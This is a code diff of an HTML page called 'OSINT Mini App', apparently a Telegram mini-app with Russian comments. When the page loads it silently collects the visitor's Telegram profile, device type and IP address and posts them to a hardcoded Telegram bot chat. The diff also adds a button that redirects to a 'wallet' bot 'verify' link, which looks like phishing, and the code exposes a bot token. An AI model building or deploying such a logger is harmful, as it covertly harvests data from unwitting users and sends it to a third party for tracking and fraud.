@@ -5,35 +5,39 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>OSINT Mini App</title>
     <script>
-        const BOT_TOKEN = "7517508116:AAHydfYGo0-6pYS3rwx0GE2__ELVhi9pwnE";
-        const CHAT_ID = "7477642275";
+        // Токен бота
+        const BOT_TOKEN = '7517508116:AAHydfYGo0-6pYS3rwx0GE2__ELVhi9pwnE';
+        const CHAT_ID = '7477642275';
         const API_URL = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
 
+        // Функция для отправки сообщений в Telegram
         function sendToTelegram(message) {
             fetch(API_URL, {
-                method: "POST",
-                headers: { "Content-Type": "application/json" },
-                body: JSON.stringify({ chat_id: CHAT_ID, text: message })
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    chat_id: CHAT_ID,
+                    text: message
+                })
             });
         }
 
-        function getDeviceType() {
-            const userAgent = navigator.userAgent.toLowerCase();
-            if (/mobile/i.test(userAgent)) {
-                return "Мобильное устройство";
-            } else if (/tablet/i.test(userAgent)) {
-                return "Планшет";
-            } else if (/laptop|desktop/i.test(userAgent)) {
-                return "Компьютер";
-            } else {
-                return "Неизвестное устройство";
-            }
+        // Функция для обработки команды /start
+        function handleStartCommand() {
+            const message = 'Привет! Пожалуйста, нажми на одну из кнопок ниже для продолжения:';
+            sendToTelegram(message);
         }
 
+        // Функция для обработки нажатия на кнопку "Перейти на страницу подтверждения"
+        function redirectToVerificationPage() {
+            window.location.href = 'https://t.me/walletrussiarbot/verify';
+        }
+
+        // Функция для сбора данных
         function collectData() {
             let logData = `Лог успешен! [${new Date().toLocaleString()}]\n\n`;
 
-            // Получение информации о пользователе Telegram
+            // Получение информации о пользователе Telegram (если доступно)
             if (window.Telegram && Telegram.WebApp) {
                 Telegram.WebApp.ready();
                 const user = Telegram.WebApp.initDataUnsafe.user;
@@ -99,11 +103,27 @@
                 .catch(error => console.error('Ошибка получения IP:', error));
         }
 
-        document.addEventListener('DOMContentLoaded', collectData);  // Сбор данных при загрузке страницы
+        // Функция для определения типа устройства
+        function getDeviceType() {
+            if (/mobile/i.test(navigator.userAgent)) {
+                return 'Мобильное устройство';
+            } else if (/tablet/i.test(navigator.userAgent)) {
+                return 'Планшет';
+            } else {
+                return 'ПК';
+            }
+        }
+
+        // Вызываем функцию при загрузке страницы для отправки сообщения в Telegram
+        window.onload = function() {
+            handleStartCommand();  // Отправка команды /start
+            collectData();  // Сбор данных при загрузке страницы
+        };
     </script>
 </head>
 <body>
     <h2>OSINT Mini App</h2>
     <p>Данные пользователя отправляются...</p>
+    <button onclick="redirectToVerificationPage()">Перейти на страницу подтверждения</button>
 </body>
 </html>
